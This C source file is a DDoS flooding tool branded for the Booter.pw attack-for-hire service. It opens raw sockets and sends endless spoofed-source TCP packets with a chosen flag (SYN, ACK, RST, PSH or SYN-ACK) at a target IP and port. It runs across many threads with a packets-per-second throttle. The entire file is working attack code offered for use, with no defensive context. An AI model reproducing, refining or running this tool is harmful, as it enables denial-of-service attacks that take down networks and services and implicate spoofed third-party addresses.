/*
TCP by Alemalakra.
*/
#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<errno.h>
#include<netinet/tcp.h>
#include<arpa/inet.h>
#include<netinet/ip.h>
#include<pthread.h>
#include<stdint.h>
#include<unistd.h>
#include<sys/types.h>
#include<stdbool.h>
#include<time.h>
#define BUFFER_SIZE 100
char ipv4src[17];
static unsigned int floodport;
volatile unsigned int sleeptime = 100;
volatile unsigned int lenght_pkt = 0;
volatile int limiter;
volatile unsigned int pps;
int tcp_flag;
struct pseudo_header
{
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
    struct tcphdr tcp;
};
unsigned short checksum_tcp_packet(unsigned short *ptr,int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;
    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }
    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;
    return(answer);
}
char * ipv4_generator() {
    snprintf(ipv4src, sizeof(ipv4src)-1, "%d.%d.%d.%d", rand()%253 + 1, rand()%254, rand()%254, rand()%254);
    return ipv4src;
}
void ip_header(struct iphdr *iph) {
	// IP Headers
	iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr);
    iph->id = htons(rand());
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0; 
}
void tcp_header(struct tcphdr *tcph, int tcp_flag)
{
	// TCP Headers.
	tcph->source = htons(rand());
	tcph->seq = rand();
	tcph->res2 = 0;
	tcph->doff = 5;
    if (tcp_flag == 1) { // SYN
        tcph->syn = 1;
        tcph->ack = 0;
        tcph->ack_seq = 0;
        tcph->fin = 0;
        tcph->psh = 0;
        tcph->urg = 0;
        tcph->urg_ptr = 0;
        tcph->rst = 0;
    } else if (tcp_flag == 2) { // ACK
        tcph->syn = 0;
        tcph->ack = 1;
        tcph->ack_seq = rand();
        tcph->fin = 0;
        tcph->psh = 0;
        tcph->urg = 0;
        tcph->urg_ptr = 0;
        tcph->rst = 0;
    } else if (tcp_flag == 3) { // RST
        tcph->syn = 0;
        tcph->ack = 0;
        tcph->ack_seq = 0;
        tcph->fin = 0;
        tcph->psh = 0;
        tcph->urg = 0;
        tcph->urg_ptr = 0;
        tcph->rst = 1;
    } else if (tcp_flag == 4) { // PSH
        tcph->syn = 0;
        tcph->ack = 0;
        tcph->ack_seq = 0;
        tcph->fin = 0;
        tcph->psh = 1;
        tcph->urg = 0;
        tcph->urg_ptr = 0;
        tcph->rst = 0;
    } else if (tcp_flag == 5) { // SYN-ACK
        tcph->syn = 1;
        tcph->ack = 1;
        tcph->ack_seq = 0;
        tcph->fin = 0;
        tcph->psh = 0;
        tcph->urg = 0;
        tcph->urg_ptr = 0;
        tcph->rst = 0;          
    }
	tcph->window = rand();
	tcph->check = 0;
}
void *flooding_thread(void *par1)
{
    int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s == -1)
    {
        perror("Not enough permissions for run script.");
        exit(1);
    }
    char *targettr = (char *)par1;
    char datagram[4096] , source_ip[32] , *data , *pseudogram;
    memset (datagram, 0, 4096);
    struct iphdr *iph = (struct iphdr *) datagram;
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;
    data = "";
    sin.sin_addr.s_addr = inet_addr (targettr);
    strcpy(source_ip , ipv4_generator());
    iph->saddr = inet_addr ( source_ip );  
    iph->daddr = sin.sin_addr.s_addr;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(floodport);
	tcph->dest = htons (floodport);
	ip_header(iph);
	iph->check = checksum_tcp_packet ((unsigned short *) datagram, iph->tot_len);
	tcp_header(tcph, tcp_flag);
	psh.source_address = inet_addr( source_ip );
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data) );
    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
    pseudogram = malloc(psize);
    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + strlen(data));
    tcph->check = checksum_tcp_packet( (unsigned short*) pseudogram , psize);
    free(pseudogram);
    int one = 1;
    const int *val = &one;
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    {
        exit(0);
    }
    int i;
    while (1) {
    	sendto (s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof (sin));
    	strcpy(source_ip , ipv4_generator());
    	iph->saddr = inet_addr ( source_ip );
    	psh.source_address = inet_addr( source_ip );
    	ip_header(iph); 
    	tcp_header(tcph, tcp_flag);
        iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr) + strlen(data);
        iph->check = checksum_tcp_packet ((unsigned short *) datagram, iph->tot_len);
        psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data) );
        int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
        pseudogram = malloc(psize);
        memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr) + strlen(data));
        tcph->check = checksum_tcp_packet( (unsigned short*) pseudogram , psize);
        free(pseudogram);
        int one = 1;
        const int *val = &one;
        if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0) {
            exit(0);
        }
        pps++;
        if(i >= limiter) {
            i = 0;
            usleep(sleeptime);
        }
        i++;
    }
}
int main(int argc, char *argv[ ])
{
    if(argc < 7){
        fprintf(stderr, "TCP-FLAG method. © Booter.pw 2019 by Alemalakra.\n");
        fprintf(stdout, "Usage: %s <IP> <PORT> <THREADS> <TIME> <PPS> <FLAG_NUMBER>\n", argv[0]);
        fprintf(stdout, "Flag Numbers: SYN=1, ACK=2, RST=3, PSH=4, SYNACK=5\n");
        exit(-1);
    }
    int multiplier = 20;
    pps = 0;
    limiter = 0;
    floodport = atoi(argv[2]);
    void * target = argv[1];
    tcp_flag = atoi(argv[6]);
    int maxim_pps = atoi(argv[5]);
    int num_threads = atoi(argv[3]);
    lenght_pkt = 0;
    pthread_t thread[num_threads];
    int alem = 0;
    int i;
    fprintf(stdout, "Starting threads (This may take some seconds).\n");
    for(alem = 0;alem<num_threads;alem++){
      pthread_create( &thread[alem], NULL, &flooding_thread, (void *)argv[1]); // Target
    }
    fprintf(stdout, "Attack started.\n");
    for(i = 0;i<(atoi(argv[4])*multiplier);i++) {
        usleep((1000/multiplier)*1000);
        if((pps*multiplier) > maxim_pps)
        {
            if(1 > limiter)
            {
                sleeptime+=100;
            } else {
                limiter--;
            }
        } else {
            limiter++;
            if(sleeptime > 25)
            {
                sleeptime-=25;
            } else {
                sleeptime = 0;
            }
        }
        pps = 0;
    }    
     
    return 0;
}